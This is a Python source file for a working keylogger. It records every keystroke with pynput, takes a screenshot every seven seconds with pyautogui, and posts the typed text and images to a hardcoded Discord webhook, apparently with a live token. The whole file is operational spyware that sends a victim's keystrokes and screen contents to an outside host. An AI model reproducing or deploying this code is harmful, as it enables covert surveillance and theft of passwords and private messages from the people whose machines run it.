import os  # For file and directory operations
from pynput.keyboard import Key, Listener  # pip install pynput
import requests  # pip install requests
import threading
import pyautogui  # pip install pyautogui

text = ""
webhook_url = "https://discord.com/api/webhooks/1355216328000147518/roTzaF_CSKbMcOpD0pETxOuWlt8jQKNWE1b39g8sKC70GG43S6zo3t3cFtGS5N0XHGyb"
time_interval = 7

# Ensure the 'images' folder exists
images_folder = "images"
if not os.path.exists(images_folder):
    os.makedirs(images_folder)

def get_unique_filename():
    """Generate a unique filename for the screenshot."""
    i = 1
    while True:
        filename = os.path.join(images_folder, f"image{i}.png")
        if not os.path.exists(filename):
            return filename
        i += 1

def take_screenshot():
    """Take a screenshot and save it with a unique name in the 'images' folder."""
    screenshot = pyautogui.screenshot()
    filename = get_unique_filename()
    screenshot.save(filename)
    return filename

def send_data():
    global text
    screenshot_path = take_screenshot()

    # Prepare the payload for the text content
    data = {
        "content": f"```\n{text}\n```",
        "title": "key_logger"
    }

    # Open the screenshot file in binary mode
    with open(screenshot_path, "rb") as image_file:
        files = {
            "file": image_file
        }

        try:
            # Send the text and screenshot as a multipart/form-data request
            requests.post(webhook_url, data=data, files=files)
        except Exception as e:
            print(f"Failed to send data: {e}")

    # Schedule the next execution
    timer = threading.Timer(time_interval, send_data)
    timer.start()

def on_press(key):
    global text
    try:
        if key == Key.space:
            text += " "
        elif key == Key.enter:
            text += "\n"
        elif key == Key.tab:
            text += "\t"
        elif key == Key.backspace:
            text = text[:-1] if text else text
        elif key == Key.esc:
            return False
        else:
            text += key.char
    except AttributeError:
        text += f" [{key}] "

with Listener(on_press=on_press) as listener:
    send_data()
    listener.join()